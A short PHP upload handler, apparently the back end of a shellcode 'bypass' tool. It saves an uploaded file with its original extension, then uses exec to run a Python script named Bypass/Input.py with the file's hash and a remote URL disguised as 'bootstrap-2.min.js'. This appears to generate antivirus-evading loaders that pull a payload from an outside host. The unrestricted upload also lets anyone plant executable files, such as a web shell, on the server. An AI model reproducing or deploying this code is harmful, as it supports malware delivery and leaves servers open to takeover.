<?php

    if ($_FILES["file"]["error"] > 0 || $_SERVER['REQUEST_METHOD'] != 'POST'){
        return;
    }else{
        $tmp_name=$_FILES['file']['tmp_name']; //文件临时保存路径
        $size=$_FILES['file']['size'];  //文件大小
        $filename=$_FILES['file']['name']; //上传过来的文件名
        $uploaddir = './_ms_uploads/'; //文件存放目录
        $type=substr(strrchr($filename, '.'), 1); 
    
        $newFileName = md5_file($tmp_name);
        $newFilePath = $newFileName.".".$type;
        $uploadfile = $uploaddir . $newFilePath; //将要保存的路径
        move_uploaded_file($tmp_name, $uploadfile);
    
        $url = "https://service-5369sd4f-1258472441.sh.apigw.tencentcs.com/bootstrap-2.min.js";
    
        $shellcode = sprintf("python ./Bypass/Input.py %s %s",$url,$newFileName);
    
        exec($shellcode,$result);
        print_r($shellcode);
        echo $result;
    
    }
    